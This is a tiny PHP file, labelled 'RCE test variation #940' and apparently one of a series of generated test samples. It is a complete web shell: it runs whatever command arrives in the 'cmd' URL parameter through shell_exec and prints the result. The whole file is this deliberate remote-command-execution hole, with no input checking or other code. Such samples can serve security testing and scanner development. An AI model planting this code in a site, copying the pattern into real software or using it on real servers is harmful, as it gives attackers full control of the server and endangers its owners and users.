<?php
// RCE test variation #940
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>